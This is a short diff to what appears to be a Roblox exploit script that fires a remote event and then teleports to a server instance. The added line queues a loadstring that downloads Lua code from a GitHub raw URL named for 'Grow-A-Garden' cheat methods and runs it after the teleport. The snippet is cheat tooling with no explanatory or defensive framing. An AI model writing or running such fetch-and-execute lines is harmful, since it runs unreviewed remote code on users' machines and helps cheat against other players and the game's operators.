@@ -9,4 +9,6 @@ end
 
 Fire(Remote)
 
+queue_on_teleport([[loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/mod1.lua'))()]])
+
 TeleportService:TeleportToPlaceInstance(PlaceId, JobId)
